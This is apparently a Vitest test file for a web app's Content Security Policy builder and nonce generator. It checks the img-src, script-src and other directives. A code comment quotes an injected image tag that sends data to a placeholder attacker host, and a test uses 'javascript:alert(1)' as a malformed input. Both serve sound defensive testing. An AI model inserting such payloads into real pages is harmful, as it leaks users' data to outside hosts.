import { afterEach, describe, expect, it, vi } from 'vitest'
import { contentSecurityPolicy, generateNonce } from './csp'

function directive(policy: string, name: string): string {
  return policy.split('; ').find((d) => d.startsWith(`${name} `)) ?? ''
}

const CDN = 'https://pub-1d9207884eeb46c8a81f34bacb0aa430.r2.dev'

describe('img-src', () => {
  afterEach(() => vi.unstubAllEnvs())

  it('never allows the whole of https:, which would be an exfiltration channel', () => {
    // An injected `<img src="https://attacker/?d=...">` is a working GET even
    // with script-src locked down, so the wildcard has to stay out.
    vi.stubEnv('NEXT_PUBLIC_CDN_URL', CDN)
    const img = directive(contentSecurityPolicy('abc123'), 'img-src')
    expect(img.split(' ')).not.toContain('https:')
  })

  it('allows the configured CDN origin', () => {
    vi.stubEnv('NEXT_PUBLIC_CDN_URL', CDN)
    expect(directive(contentSecurityPolicy('abc123'), 'img-src')).toContain(CDN)
  })

  it('keeps self, data: and blob: for slips, the placeholder pixel and upload previews', () => {
    vi.stubEnv('NEXT_PUBLIC_CDN_URL', CDN)
    const img = directive(contentSecurityPolicy('abc123'), 'img-src')
    expect(img).toContain("'self'")
    expect(img).toContain('data:')
    expect(img).toContain('blob:')
  })

  it('omits the CDN when none is configured, as in dev', () => {
    vi.stubEnv('NEXT_PUBLIC_CDN_URL', '')
    expect(directive(contentSecurityPolicy(null), 'img-src')).toBe("img-src 'self' data: blob:")
  })

  it('reduces a value carrying a path to its origin', () => {
    vi.stubEnv('NEXT_PUBLIC_CDN_URL', 'https://cdn.merxylab.com/products/')
    expect(directive(contentSecurityPolicy('abc123'), 'img-src')).toContain(
      'https://cdn.merxylab.com',
    )
    expect(directive(contentSecurityPolicy('abc123'), 'img-src')).not.toContain('/products')
  })

  it('ignores a malformed value rather than emitting it into the policy', () => {
    for (const bad of ['not a url', 'javascript:alert(1)', '://broken']) {
      vi.stubEnv('NEXT_PUBLIC_CDN_URL', bad)
      expect(directive(contentSecurityPolicy('abc123'), 'img-src')).toBe(
        "img-src 'self' data: blob:",
      )
    }
  })
})

describe('contentSecurityPolicy', () => {
  it('never allows inline script when a nonce is supplied', () => {
    const script = directive(contentSecurityPolicy('abc123'), 'script-src')
    expect(script).toContain("'nonce-abc123'")
    expect(script).toContain("'strict-dynamic'")
    expect(script).not.toContain("'unsafe-inline'")
    expect(script).not.toContain("'unsafe-eval'")
  })

  it('falls back to inline script only when there is no nonce', () => {
    const script = directive(contentSecurityPolicy(null), 'script-src')
    expect(script).toContain("'unsafe-inline'")
  })

  it('keeps the directives that blunt an injection even if one lands', () => {
    const policy = contentSecurityPolicy('abc123')
    expect(policy).toContain("default-src 'self'")
    expect(policy).toContain("object-src 'none'")
    expect(policy).toContain("base-uri 'self'")
    expect(policy).toContain("form-action 'self'")
    expect(policy).toContain("frame-ancestors 'none'")
  })

  it('still permits inline style, which cannot execute', () => {
    expect(directive(contentSecurityPolicy('abc123'), 'style-src')).toContain("'unsafe-inline'")
  })

  it('emits one entry per directive', () => {
    const names = contentSecurityPolicy('abc123')
      .split('; ')
      .map((d) => d.split(' ')[0])
    expect(new Set(names).size).toBe(names.length)
  })
})

describe('generateNonce', () => {
  it('is unique per call', () => {
    const nonces = new Set(Array.from({ length: 100 }, generateNonce))
    expect(nonces.size).toBe(100)
  })

  it('produces a value that survives a header round-trip unquoted', () => {
    expect(generateNonce()).toMatch(/^[A-Za-z0-9+/=]+$/)
  })
})
